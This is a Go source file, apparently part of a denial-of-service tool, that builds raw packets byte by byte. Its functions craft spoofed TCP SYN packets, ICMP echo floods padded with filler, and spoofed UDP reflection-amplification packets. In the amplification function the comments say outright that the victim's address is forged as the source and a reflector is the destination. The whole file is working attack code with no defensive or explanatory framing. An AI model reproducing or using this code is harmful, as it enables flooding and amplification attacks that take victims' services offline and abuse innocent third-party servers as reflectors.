// Package packet provides helpers for building raw IP/TCP/UDP/ICMP packets.
package packet

import (
	"encoding/binary"
	"math/rand"
	"net"
)

// Checksum computes the Internet checksum over b.
func Checksum(b []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(b); i += 2 {
		sum += uint32(b[i])<<8 | uint32(b[i+1])
	}
	if len(b)%2 != 0 {
		sum += uint32(b[len(b)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// tcpChecksum builds a pseudo-header and returns the TCP checksum.
func tcpChecksum(src, dst net.IP, tcpSegment []byte) uint16 {
	pseudo := make([]byte, 12+len(tcpSegment))
	copy(pseudo[0:4], src.To4())
	copy(pseudo[4:8], dst.To4())
	pseudo[8] = 0
	pseudo[9] = 6 // TCP
	binary.BigEndian.PutUint16(pseudo[10:], uint16(len(tcpSegment)))
	copy(pseudo[12:], tcpSegment)
	return Checksum(pseudo)
}

// udpChecksum computes UDP checksum using pseudo-header.
func udpChecksum(src, dst net.IP, udpSeg []byte) uint16 {
	pseudo := make([]byte, 12+len(udpSeg))
	copy(pseudo[0:4], src.To4())
	copy(pseudo[4:8], dst.To4())
	pseudo[8] = 0
	pseudo[9] = 17 // UDP
	binary.BigEndian.PutUint16(pseudo[10:], uint16(len(udpSeg)))
	copy(pseudo[12:], udpSeg)
	return Checksum(pseudo)
}

// BuildSYN builds a raw IP+TCP SYN packet spoofed from srcIP to dstIP:dstPort.
func BuildSYN(srcIP, dstIP net.IP, dstPort uint16) []byte {
	buf := make([]byte, 40)

	// IP header (20 bytes)
	buf[0] = 0x45
	buf[1] = 0
	binary.BigEndian.PutUint16(buf[2:], 40)
	binary.BigEndian.PutUint16(buf[4:], uint16(rand.Intn(65535)))
	buf[6] = 0
	buf[7] = 0
	buf[8] = 64
	buf[9] = 6 // TCP
	// checksum at [10:12] — let kernel fill (IP_HDRINCL)
	copy(buf[12:16], srcIP.To4())
	copy(buf[16:20], dstIP.To4())

	// TCP header (20 bytes) at offset 20
	srcPort := uint16(32768 + rand.Intn(32767))
	binary.BigEndian.PutUint16(buf[20:], srcPort)
	binary.BigEndian.PutUint16(buf[22:], dstPort)
	binary.BigEndian.PutUint32(buf[24:], rand.Uint32()) // seq
	binary.BigEndian.PutUint32(buf[28:], 0)             // ack
	buf[32] = 0x50                                      // data offset=5
	buf[33] = 0x02                                      // SYN flag
	binary.BigEndian.PutUint16(buf[34:], 65535)         // window
	binary.BigEndian.PutUint16(buf[38:], 0)             // urgent

	cksum := tcpChecksum(srcIP.To4(), dstIP.To4(), buf[20:])
	binary.BigEndian.PutUint16(buf[36:], cksum)
	return buf
}

// BuildICMP builds an ICMP Echo Request packet (IP + ICMP).
func BuildICMP(srcIP, dstIP net.IP, payloadSize int) []byte {
	if payloadSize < 16 {
		payloadSize = 16
	}
	total := 20 + 8 + payloadSize
	buf := make([]byte, total)

	// IP header
	buf[0] = 0x45
	binary.BigEndian.PutUint16(buf[2:], uint16(total))
	binary.BigEndian.PutUint16(buf[4:], uint16(rand.Intn(65535)))
	buf[8] = 64
	buf[9] = 1 // ICMP
	copy(buf[12:16], srcIP.To4())
	copy(buf[16:20], dstIP.To4())

	// ICMP header at offset 20
	buf[20] = 8 // Echo request
	buf[21] = 0
	// fill payload with 'A'
	for i := 28; i < total; i++ {
		buf[i] = 'A'
	}
	cksum := Checksum(buf[20:])
	binary.BigEndian.PutUint16(buf[22:], cksum)
	return buf
}

// BuildAMP builds a spoofed UDP amplification packet (IP+UDP+payload).
// srcIP = target (we spoof src), dstIP = reflector, dstPort = reflector port.
func BuildAMP(srcIP net.IP, srcPort uint16, dstIP net.IP, dstPort uint16, payload []byte) []byte {
	total := 20 + 8 + len(payload)
	buf := make([]byte, total)

	// IP header
	buf[0] = 0x45
	binary.BigEndian.PutUint16(buf[2:], uint16(total))
	binary.BigEndian.PutUint16(buf[4:], uint16(rand.Intn(65535)))
	buf[8] = 64
	buf[9] = 17 // UDP
	copy(buf[12:16], srcIP.To4())
	copy(buf[16:20], dstIP.To4())

	// UDP header at offset 20
	binary.BigEndian.PutUint16(buf[20:], srcPort)
	binary.BigEndian.PutUint16(buf[22:], dstPort)
	binary.BigEndian.PutUint16(buf[24:], uint16(8+len(payload)))
	copy(buf[28:], payload)

	cksum := udpChecksum(srcIP.To4(), dstIP.To4(), buf[20:])
	binary.BigEndian.PutUint16(buf[26:], cksum)
	return buf
}
